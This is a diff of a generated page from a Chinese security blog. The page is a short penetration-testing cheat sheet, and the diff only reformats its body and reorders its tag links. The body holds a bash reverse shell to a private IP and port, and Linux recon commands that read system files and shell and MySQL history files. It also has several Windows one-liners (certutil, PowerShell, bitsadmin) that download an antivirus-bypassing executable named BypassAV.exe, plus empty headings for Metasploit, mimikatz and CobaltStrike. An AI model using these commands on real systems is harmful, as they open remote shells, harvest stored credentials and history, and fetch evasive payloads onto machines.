@@ -5,13 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="常用记不住的命令(补充ing), jokerscar&#39;blogs">
-    <meta name="description" content="
-Metasploit
-生成木马
-meterpreter配置静态路由run autoroute -s 10.xx.xx.xx&amp;#x2F;24
-
-Linux
-反弹shellbash:bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x">
+    <meta name="description" content="Metasploit生成木马meterpreter配置静态路由
+run autoroute -s 10.xx.xx.xx&amp;#x2F;24
+Linux反弹shellbash:
+bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -447,31 +444,29 @@ Linux
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><a name="iLCGg"></a></p>
-<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p><a name="eTVQI"></a></p>
-<h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p><a name="YNDgL"></a></p>
-<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>配置静态路由<br>run autoroute -s 10.xx.xx.xx&#x2F;24</p>
-<p><a name="ldlkw"></a></p>
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p><a name="aYBXY"></a></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>bash:<br><strong>bash</strong> -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;<strong>192.168.65.128</strong>&#x2F;<strong>6767</strong> 0&gt;&amp;1<br>更多：<br><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a><br><a name="O5ATS"></a></p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>是否在docker中<br>&#x2F;proc&#x2F;1&#x2F;cgroup</p>
-<p><strong>系统版本</strong><br>cat &#x2F;etc&#x2F;issue<br><em><strong>内核版本</strong></em><br>cat &#x2F;proc&#x2F;version<br><strong>环境变量</strong><br>cat &#x2F;etc&#x2F;profile<br><strong>开机自启</strong><br>cat &#x2F;etc&#x2F;crontab<br><strong>命令记录</strong><br>cat ~&#x2F;.bash_history<br>cat ~&#x2F;.nano_history<br>cat ~&#x2F;.atftp_history<br>cat ~&#x2F;.mysql_history<br>cat ~&#x2F;.php_history<br><a name="hsj6L"></a></p>
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p><a name="XuoyI"></a></p>
-<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><a name="mTAZB"></a></p>
-<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>certutil.exe -urlcache -split -f “<a href="http://ip:port/BypassAV.exe&quot;">http://ip:port/BypassAV.exe&quot;</a> bad.txt</p>
+                <h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>配置静态路由</p>
+<p>run autoroute -s 10.xx.xx.xx&#x2F;24</p>
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>bash:</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.65.128**&#x2F;**6767 0&gt;&amp;1</p>
+<p>更多：</p>
+<p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>是否在docker中</p>
+<p>&#x2F;proc&#x2F;1&#x2F;cgroup</p>
+<p>系统版本</p>
+<p>cat &#x2F;etc&#x2F;issue</p>
+<p>内核版本</p>
+<p>cat &#x2F;proc&#x2F;version</p>
+<p>环境变量</p>
+<p>cat &#x2F;etc&#x2F;profile</p>
+<p>开机自启</p>
+<p>cat &#x2F;etc&#x2F;crontab</p>
+<p>命令记录<br>cat ~&#x2F;.bash_history<br>cat ~&#x2F;.nano_history<br>cat ~&#x2F;.atftp_history<br>cat ~&#x2F;.mysql_history<br>cat ~&#x2F;.php_history<br><a name="hsj6L"></a></p>
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>certutil.exe -urlcache -split -f “<a href="http://ip:port/BypassAV.exe&quot;">http://ip:port/BypassAV.exe&quot;</a> bad.txt</p>
 <p>powershell Invoke-WebRequest -Uri <a href="http://ip:port/BypassAV.exe">http://ip:port/BypassAV.exe</a> -OutFile a.exe</p>
 <p>powershell Start-BitsTransfer -Source <a href="http://ip:port/BypassAV.exe">http://ip:port/BypassAV.exe</a> -Destination a.txt</p>
 <p>powershell (new-object System.Net.WebClient).DownloadFile(‘ip:port&#x2F;BypassAV.exe’, ‘a.exe’)</p>
 <p>bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal “ip:port&#x2F;BypassAV.exe”</p>
-<p><a name="GVSlr"></a></p>
-<h1 id="mimikataz"><a href="#mimikataz" class="headerlink" title="mimikataz"></a>mimikataz</h1><p><a name="XIeE3"></a></p>
-<h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><p><a name="Lek0d"></a></p>
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><a name="bjV99"></a></p>
-<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p><a name="gcejV"></a></p>
-<h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><p><a name="BxnNH"></a></p>
-<h1 id="Codeql"><a href="#Codeql" class="headerlink" title="Codeql"></a>Codeql</h1><p><a name="FWrQY"></a></p>
-<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><p><a name="m4epA"></a></p>
-<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop&#x2F;</a></p>
+<h1 id="mimikataz"><a href="#mimikataz" class="headerlink" title="mimikataz"></a>mimikataz</h1><h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><h1 id="Codeql"><a href="#Codeql" class="headerlink" title="Codeql"></a>Codeql</h1><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop&#x2F;</a></p>
 
                 
             </div>
@@ -627,16 +622,16 @@ Linux
                         <span class="chip bg-color">漏洞分析</span>
                     </a>
                     
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
+                        <span class="chip bg-color">反序列化利用链</span>
+                    </a>
+                    
                     <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                         <span class="chip bg-color">Java代码审计</span>
                     </a>
                     
                     <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
                         <span class="chip bg-color">反序列化漏洞</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
-                        <span class="chip bg-color">反序列化利用链</span>
                     </a>
                     
                     <a href="/tags/JNDI%E6%B3%A8%E5%85%A5/">
